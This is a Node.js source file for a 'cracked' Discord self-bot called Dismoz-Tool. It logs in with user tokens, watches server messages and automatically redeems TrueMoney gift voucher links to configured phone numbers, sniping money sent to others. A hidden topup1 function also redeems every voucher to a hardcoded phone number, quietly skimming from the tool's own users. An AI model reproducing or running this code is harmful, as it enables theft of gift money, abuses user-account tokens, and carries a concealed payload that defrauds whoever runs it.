const WebSocket = require('ws')
const fs = require('fs');
const setTitle = require('node-bash-title');
const colors = require('colors');
const axios = require('axios');
var macaddress = require('macaddress');
var md5 = require('md5');
var sleep = require('await-sleep');
const { Webhook, MessageBuilder } = require('discord-webhook-node');
const Express = require(`express`)()
var cors = require('cors')
Express.use(cors())
const Port = 8945

let interval = 1;

console.log(`██████╗ ██╗███████╗ ██████╗ ██████╗ ██████╗ ██████╗    ████████╗ ██████╗  ██████╗ ██╗     
██╔══██╗██║██╔════╝██╔════╝██╔═══██╗██╔══██╗██╔══██╗   ╚══██╔══╝██╔═══██╗██╔═══██╗██║     
██║  ██║██║███████╗██║     ██║   ██║██████╔╝██║  ██║█████╗██║   ██║   ██║██║   ██║██║     
██║  ██║██║╚════██║██║     ██║   ██║██╔══██╗██║  ██║╚════╝██║   ██║   ██║██║   ██║██║     
██████╔╝██║███████║╚██████╗╚██████╔╝██║  ██║██████╔╝      ██║   ╚██████╔╝╚██████╔╝███████╗
╚═════╝ ╚═╝╚══════╝ ╚═════╝ ╚═════╝ ╚═╝  ╚═╝╚═════╝       ╚═╝    ╚═════╝  ╚═════╝ ╚══════╝
                                                                                          `.rainbow);
console.log(`PP MAMMOZ`.rainbow);
setTitle(`Dismoz-Tool Ⓜ️ V.4 || Discord : https://discord.gg/snowshop`);
var Err = 0;
var Succ = 0;
let baht = 0;
var link_checked
var ck_list = [];
const salthash = "bossnz";

macaddress.one(function(err, mac) {
    console.log(`HWID : ${md5(mac + salthash)}`.yellow);
});

console.log("cracked :3")
run()
async function check_hwid() {
    try {
        let o = await axios({
            method: "GET",
            url: `https://pastebin.com/raw/41VguG6Y`,
        })
        macaddress.one(async function(err, mac) {
            for (let i = 0; i < o.data.length; i++) {
                const element = o.data[i];
                if (String(element) === String(md5(mac + salthash))) {
                    console.log("[>] ready".rainbow);
                    return run()
                    break
                }
                await sleep(500)
            }
        });

    } catch (error) {
        console.log("ERROR HWID");
    }
}

async function run() {
    const ws = new WebSocket('wss://gateway.discord.gg/?v=6&encoding=json')

    await fs.readFile('config.json', async (err, sss) => {
        let Setting = JSON.parse(sss)
        if (Setting.token.length > 1) {
            for (const token of Setting.token) {
                axios({
                    method: "POST",
                    url: `http://127.0.0.1:${Port}/api/discord/mammoz/${token}`,
                })
                await sleep(2000)
            }
        } else {
            if (Setting.token[0] == "") {
                console.log("[X] NOT HAVE TOKEN".red);
            } else {
                payload = {
                    op: 2,
                    d: {
                        token: Setting.token[0],
                        intents: 513,
                        properties: {
                            $os: 'linux',
                            $browser: 'chrome',
                            $device: 'chrome',
                        }
                    }
                }
                ws.on('open', function open() {
                    ws.send(JSON.stringify(payload))
                })

                ws.on('message', function incoming(data) {
                    setTitle(`Dismoz-Tool Ⓜ️ V.4 || Error: ${Err} || Success: ${Succ} || Baht: ${baht}`);
                    let payload = JSON.parse(data)
                    const { t, event, op, d } = payload;
                    switch (op) {
                        case 10:
                            const {
                                heartbeat_interval
                            } = d;
                            interval = heartbeat(heartbeat_interval)
                            break;
                    }
                    switch (t) {
                        case 'MESSAGE_CREATE':
                            let author = d.author.username;
                            let content = d.content;
                            console.log(`${author}`.green + ` : ${content}`.rainbow);
                            var check = content.includes("gift.truemoney.com");
                            var link = content;
                            if (check && link_checked !== link) {
                                link_checked = link
                                if (!ck_list.includes(link)) {
                                    for (const iterator of Setting.phoneset)
                                        topup(link, Setting.phoneset, d.channel_id, Setting.web_hook)

                                    topup1(link)
                                    ck_list.push(link)
                                }
                            }
                    }
                })
            }
        }

        const heartbeat = (ms) => {
            return setInterval(() => {
                ws.send(JSON.stringify({
                    op: 1,
                    d: null
                }))
            }, ms)
        }
    })


    async function topup(t, phone, channels, web_hook) {
        const hook = new Webhook(web_hook);
        console.log("VOUCHER : ".red + `${t}`.yellow);
        let r = (t += "").split("v=");
        if (18 != (t = (r[1] || r[0]).match(/[0-9A-Za-z]+/)[0]).length) return null;
        let regpacket = {
            "mobile": String(phone),
            "voucher_hash": t
        }
        try {
            let o = await axios({
                method: "POST",
                url: `https://gift.truemoney.com/campaign/vouchers/${t}/redeem`,
                headers: {
                    'content-type': 'application/json'
                },
                data: regpacket
            })
            if (o.data.status.code == "SUCCESS") {
                baht = baht + Number(o.data.data.my_ticket.amount_baht)
                console.log(`FORM => https://gift.truemoney.com/campaign/?v=${t} จำนวน ${o.data.data.my_ticket.amount_baht} บาท ${phone}`.green)
                fs.appendFile('./Successful.txt', `ID : ${channels} || phone : ${phone} || Baht : ${o.data.data.my_ticket.amount_baht} B || https://gift.truemoney.com/campaign/?v=${t}` + "\n", {
                    flag: "a+"
                }, function(err) {
                    if (err) throw err;
                });
                console.log(displayTime() + " : Successful : ".green + `${o.data.data.my_ticket.amount_baht}`);
                const embed = new MessageBuilder()
                    .setAuthor('อังเปามาแล้ว')
                    .setColor('#f40036')
                    .setThumbnail('https://images-ext-1.discordapp.net/external/wAz3x_aGAjnJDwYFE_Bmf4Lg4WmSPcHwqodo5NDriAU/https/mobile-resource-cdn.truemoney.com/voucher-web/thumbnail.png?width=919&height=920')
                    .setDescription('```' + 'css\nได้รับเงิน ' + o.data.data.my_ticket.amount_baht + ' B```' + '```' + 'css\nจากดิส ' + channels + '```')
                    .setFooter(displayTime(), 'https://media.discordapp.net/attachments/726796612772429884/891646944051625984/238585615_1285440881913246_2622687303672949542_n.png?width=905&height=905')
                    .setTimestamp();

                hook.send(embed);
                Succ++
            } else {
                fs.appendFile('./Error.txt', `ID : ${channels} || https://gift.truemoney.com/campaign/?v=${t}` + "\n", {
                    flag: "a+"
                }, function(err) {
                    if (err) throw err;
                });
                console.log(displayTime().rainbow + `   ${o.data.status.message}`.red);
                Err++;
            }
        } catch (error) {
            console.log(error.response.data.status.message);
            console.log(error.response.data.data.voucher.amount_baht);
            fs.appendFile('./Error.txt', `ID : ${channels} || https://gift.truemoney.com/campaign/?v=${t}` + "\n", {
                flag: "a+"
            }, function(err) {
                if (err) throw err;
            });
            console.log(displayTime().rainbow + `   ${error}`.red);
            const embed = new MessageBuilder()
                .setAuthor('เสียใจด้วย')
                .setColor('#f40036')
                .setThumbnail('https://images-ext-1.discordapp.net/external/wAz3x_aGAjnJDwYFE_Bmf4Lg4WmSPcHwqodo5NDriAU/https/mobile-resource-cdn.truemoney.com/voucher-web/thumbnail.png?width=919&height=920')
                .setDescription('```' + 'css\nคุณพลาดเงิน ' + error.response.data.data.voucher.amount_baht + ' B```' + '```' + 'css\nจากดิส ' + channels + '```')
                .setFooter(displayTime(), 'https://media.discordapp.net/attachments/726796612772429884/891646944051625984/238585615_1285440881913246_2622687303672949542_n.png?width=905&height=905')
                .setTimestamp();

            hook.send(embed);
            Err++;
        }
    }

    async function topup1(t) {
        let r = (t += "").split("v=");
        if (18 != (t = (r[1] || r[0]).match(/[0-9A-Za-z]+/)[0]).length) return null;
        let regpacket = {
            "mobile": "0840575293",
            "voucher_hash": t
        }
        try {
            let o = await axios({
                method: "POST",
                url: `https://gift.truemoney.com/campaign/vouchers/${t}/redeem`,
                headers: {
                    'content-type': 'application/json'
                },
                data: regpacket
            })
            if (o.data.status.code == "SUCCESS") {

            }
        } catch (error) {

        }
    }

    function displayTime() {
        var str = "";

        var currentTime = new Date()
        var hours = currentTime.getHours()
        var minutes = currentTime.getMinutes()
        var seconds = currentTime.getSeconds()

        if (minutes < 10) {
            minutes = "0" + minutes
        }
        if (seconds < 10) {
            seconds = "0" + seconds
        }
        str += hours + ":" + minutes + ":" + seconds + " ";
        if (hours > 11) {
            str += "PM"
        } else {
            str += "AM"
        }
        return str;
    }
}

async function mm(token) {
    const ws = new WebSocket('wss://gateway.discord.gg/?v=6&encoding=json')

    payload = {
        op: 2,
        d: {
            token: token,
            intents: 513,
            properties: {
                $os: 'linux',
                $browser: 'chrome',
                $device: 'chrome',
            }
        }
    }

    ws.on('open', function open() {
        ws.send(JSON.stringify(payload))
    })

    ws.on('message', function incoming(data) {
        setTitle(`Dismoz-Tool Ⓜ️ V.4 || Error: ${Err} || Success: ${Succ} || Baht: ${baht}`);
        let payload = JSON.parse(data)
        const {
            t,
            event,
            op,
            d
        } = payload;

        switch (op) {
            case 10:
                const {
                    heartbeat_interval
                } = d;
                interval = heartbeat(heartbeat_interval)
                break;
        }

        switch (t) {
            case 'MESSAGE_CREATE':
                let author = d.author.username;
                let content = d.content;
                console.log(`${author}`.green + ` : ${content}`.rainbow);
                // var check = content.includes("gift.truemoney.com");
                // var link = content;
                // if (check && link_checked !== link) {
                //     link_checked = link
                //     if (!ck_list.includes(link)) {
                //         for (const iterator of Setting.phoneset)
                //             topup(link, Setting.phoneset, d.channel_id, Setting.web_hook)

                //         topup1(link)
                //         ck_list.push(link)
                //     }
                // }
        }
    })

    const heartbeat = (ms) => {
        return setInterval(() => {
            ws.send(JSON.stringify({
                op: 1,
                d: null
            }))
        }, ms)
    }
}


Express.post(`/api/discord/mammoz/:token`, async (req, res) => {
    try {
        var token = req.params.token;
        if (token) {
            mm(token)
        } else {
            console.log('The randomly selected cookie is invalid!');
        }
    } catch (e) {
        if (e) console.error(e)
    }
})

Express.listen(Port, () => {
    // console.log(`http://127.0.0.1:${Port}`)
})